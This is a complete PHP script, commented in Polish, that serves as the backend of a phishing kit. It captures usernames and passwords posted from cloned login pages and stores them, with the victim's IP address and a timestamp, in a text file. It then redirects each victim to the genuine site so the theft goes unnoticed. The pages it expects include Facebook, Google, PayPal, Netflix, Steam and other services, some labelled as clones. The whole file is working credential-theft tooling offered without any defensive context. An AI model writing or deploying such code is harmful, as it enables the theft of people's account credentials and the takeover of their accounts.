<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Pobieranie danych z formularza
    $username = $_POST['username'] ?? 'brak_username';
    $password = $_POST['password'] ?? 'brak_password';
    $source = $_POST['source'] ?? 'Unknown';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    // Format zapisu danych
    $data = "[$timestamp] IP: $ip | Source: $source | Username: $username | Password: $password\n";

    // Zapis danych do pliku
    file_put_contents("dane.txt", $data, FILE_APPEND);

    // Mapowanie źródła na prawdziwą stronę
    $redirects = [
        'Facebook' => 'https://facebook.com',
        'fb_secure' => 'https://facebook.com',
        'Facebook Secure Page' => 'https://facebook.com',
        'Google' => 'https://accounts.google.com',
        'Gmail' => 'https://mail.google.com',
        'Netflix' => 'https://www.netflix.com',
        'PayPal' => 'https://www.paypal.com',
        'PayPal Clone' => 'https://www.paypal.com',
        'Instagram' => 'https://www.instagram.com',
        'LinkedIn' => 'https://www.linkedin.com',
        'Snapchat' => 'https://www.snapchat.com',
        'GitHub' => 'https://github.com',
        'Onet' => 'https://onet.pl',
        'Messenger' => 'https://www.messenger.com',
        'Steam' => 'https://store.steampowered.com',
        'EpicGames' => 'https://www.epicgames.com'
    ];

    // Wybranie adresu przekierowania
    $redirectUrl = $redirects[$source] ?? 'https://google.com';

    // Przekierowanie użytkownika
    header("Location: $redirectUrl");
    exit();
}
?>
